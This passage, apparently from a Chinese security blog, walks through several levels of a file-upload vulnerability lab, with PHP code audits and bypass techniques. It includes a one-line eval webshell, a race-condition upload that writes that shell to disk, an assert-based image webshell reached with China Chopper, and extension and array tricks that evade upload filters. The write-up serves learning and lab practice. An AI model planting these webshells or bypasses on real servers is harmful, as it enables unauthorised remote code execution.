<span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string">'./1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>再准备一张普通的png图片。在该目录下输入命令 php pass17.php pass17.png</p>
<p>前面是脚本的名字，后面是png图片保存的名字。然后就会生存fox.png</p>
<p>上传，在目录下打开发现一句话木马没有被改变。这个一句话木马需要同时传参GET参数0和POST参数1才行</p>
<p>用菜刀连接file=./upload/1234.png&amp;0=assert  密码是1 就可以了</p>
<p>注：</p>
<p>#这里不能用eval函数 </p>
<p>#只有php.ini中开启short_open_tag 才可以用&lt;?  代替 &lt;?php  , 用&lt;?= 代替 &lt;? echo</p>
<p>#在PHP7.1版本以后，assert()默认不再可以执行代码 就像eval一样。所以说 assert也和eval一样不能被可变函数调用。</p>
<h3 id="0x18"><a href="#0x18" class="headerlink" title="#0x18"></a>#0x18</h3><p>代码审计</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
<p>这里是先把文件存进服务器里，再进行文件类型的判断，正确改名上传。错误则删除。</p>
<p>所以可以利用它判断的时间差，来上传木马文件。</p>
<pre><code>&lt;?php 
fputs(fopen(&#39;fox.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[fox]);?&gt;&#39;);
?&gt;</code></pre>
<p>用burp截住包,我们需要的不断重放这个数据包，所以选择没有负载。线程设高一点，然后开始攻击。不断刷新页面即可，就会在目录下生存fox.php的木马文件。</p>
<h3 id="0x19"><a href="#0x19" class="headerlink" title="#0x19"></a>#0x19</h3><p>还没学完面向对象，下次再补！</p>
<h3 id="0x20"><a href="#0x20" class="headerlink" title="#0x20"></a>#0x20</h3><p>函数知识补充：</p>
<p>#pathinfo(path,options) </p>
<p>以数组的形式返回关于文件路径的信息。</p>
<p>返回的数组元素如下：</p>
<pre class=" language-php"><code class="language-php"><span class="token punctuation">[</span>dirname<span class="token punctuation">]</span><span class="token punctuation">:</span> 目录路径
<span class="token punctuation">[</span>basename<span class="token punctuation">]</span><span class="token punctuation">:</span> 文件名
<span class="token punctuation">[</span>extension<span class="token punctuation">]</span><span class="token punctuation">:</span> 文件后缀名
<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">:</span> 不包含后缀的文件名</code></pre>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>path</td>
<td>必需。规定要检查的路径。</td>
</tr>
<tr>
<td>options</td>
<td>可选。规定要返回的数组元素。默认是 all。可能的值：  PATHINFO_DIRNAME - 只返回 dirname     PATHINFO_BASENAME - 只返回 basename     PATHINFO_EXTENSION - 只返回 extension PATHINFO_FILENAME - 只返回 filename</td>
</tr>
</tbody></table>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token string">"/testweb/test.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span>
<span class="token punctuation">(</span>
    <span class="token punctuation">[</span>dirname<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>testweb
    <span class="token punctuation">[</span>basename<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test<span class="token punctuation">.</span>txt
    <span class="token punctuation">[</span>extension<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> txt
    <span class="token punctuation">[</span>filename<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> test
<span class="token punctuation">)</span></code></pre>
<p>直接代码审计就可绕过。利用前面的思想用fox.php. .绕过。或许还有其他方法，自己发散思维。</p>
<h3 id="0x21"><a href="#0x21" class="headerlink" title="#0x21"></a>#0x21</h3><p>函数知识补充：</p>
<p>#end(array)</p>
<p>将内部指针指向数组中的最后一个元素，并输出。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>必需。规定要使用的数组。</td>
</tr>
</tbody></table>
<p>相关的方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-current.html">current()</a> - 返回数组中的当前元素的值。</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-next.html">next()</a> - 将内部指针指向数组中的下一个元素，并输出。</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-prev.html">prev()</a> - 将内部指针指向数组中的上一个元素，并输出。</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-reset.html">reset()</a> - 将内部指针指向数组中的第一个元素，并输出。</li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-array-each.html">each()</a> - 返回当前元素的键名和键值，并将内部指针向前移动。</li>
</ul>
<p>#reset(array)</p>
<p>将内部指针指向数组中的第一个元素，并输出</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><em>array</em></td>
<td>必需。规定要使用的数组。</td>
</tr>
</tbody></table>
<p>这关是修改save_name将其改成一个数组</p>
<p><img src="/images/16.png"></p>
<p>因为先验证MIME类型所以需要修改Conent-Type</p>
<p>然后利用数组方式来绕过后面的验证。</p>
<p>注：</p>
<p>#php后面要加/ 不然会生成fox.php.jpg</p>
<p>#jpg的位置必须&gt;=2即④的位置</p>
<p>#jpg可以换成gif或者png，但前面不能加其他的东西</p>
<p>理解不了，可以自己把每个步骤echo出来观察变化。（我是这样做的，帮助自己理解）</p>
<p>不足之处请见谅！作者是菜鸟。。。</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="" href="/page/5/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/7/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>